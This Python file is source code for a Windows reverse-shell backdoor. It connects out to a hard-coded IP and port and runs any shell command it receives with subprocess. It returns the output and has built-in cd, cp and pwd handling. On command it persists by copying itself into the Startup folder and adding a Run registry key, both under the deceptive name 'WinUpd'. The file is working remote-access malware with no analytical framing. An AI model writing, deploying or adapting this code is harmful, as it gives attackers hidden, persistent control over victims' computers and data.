import socket
import subprocess
import os
import shutil
import winreg
import sys
import time

def add_to_startup(username):
    startup_path = rf"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WinUpd.pyw"
    source_path = os.path.abspath(sys.argv[0]) # Finds where the script is currently running
    os.makedirs(os.path.dirname(startup_path), exist_ok=True) # Make sure the folder exists
    shutil.copy2(source_path, startup_path) # Copy the script

def add_to_registry(path):
    key = winreg.HKEY_CURRENT_USER
    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    with winreg.OpenKey(key, key_path, 0, winreg.KEY_SET_VALUE) as reg_key:
        winreg.SetValueEx(reg_key, "WinUpd", 0, winreg.REG_SZ, path)

def connect():
    while True: # Loop means it will listen forever when it runs (and it runs on startup when configured)
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('192.168.8.121', 10112)) # Get connected up
            return client
            break
        except Exception as e:
            print(f"Connection failed: {e}")
            time.sleep(1)

def recieve():
    client = connect()

    while True:
        try:
            command = client.recv(65536).decode() # Get whatever command was sent through
            if command.lower() == 'exit': # Break
                break
            elif command.startswith('cd '):
                try:
                    new_dir = command.strip('cd ').strip() # 1st strip seperates cd from say /home/kali. 2nd strip just removes whitespace from the start and finish of the /home/kali
                    os.chdir(new_dir) # cd text that was passed through is actually not used. Instead a builting chdir function pulls your /home/kali and changes to it
                    output = f'Changed directory to: {os.getcwd()}\n' # Output must be printed with a get working directory so that the program doesn't hit a standstill after a cd
                except Exception as e:
                    output = str(e) # If an error then send that as the output to the server
            elif command.startswith('cp '):
                try:
                    parts = command.split()
                    if len(parts) >= 3:
                        source = parts[1]
                        destination = parts[2]
                        
                        if os.path.isdir(source):
                            shutil.copytree(source, destination)
                            output = f"Directory copied: {source} -> {destination}\n"
                        else:
                            shutil.copy2(source, destination)
                            output = f"File copied: {source} -> {destination}\n"
                    else:
                        output = "Usage: cp source destination\n"
                except Exception as e:
                    output = f"cp: {str(e)}\n"
            elif command == "pwd":
                output = os.getcwd()
            elif command.startswith('apply '):
                try:
                    username = command.removeprefix('apply ').strip()
                    script_path = rf"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WinUpd.pyw"
                    add_to_registry(script_path)
                    add_to_startup(username)
                    output = f'Registered {script_path} for registry startup.'
                except Exception as e:
                    output = str(e)
            else:
                try:
                    output = f'$ > {subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True).decode()}' # An additional $ > is here because some text must be printed to stop the program hitting another standstill when running certain commands that do not print any output. For example mkdir (foldername) prints nothing and so the server is left waiting for some form of output forever
                except Exception as e:
                    output = str(e)
            client.send(output.encode()) # Send that shit off
        except Exception as e:
            client.close()
            client = connect()

recieve()
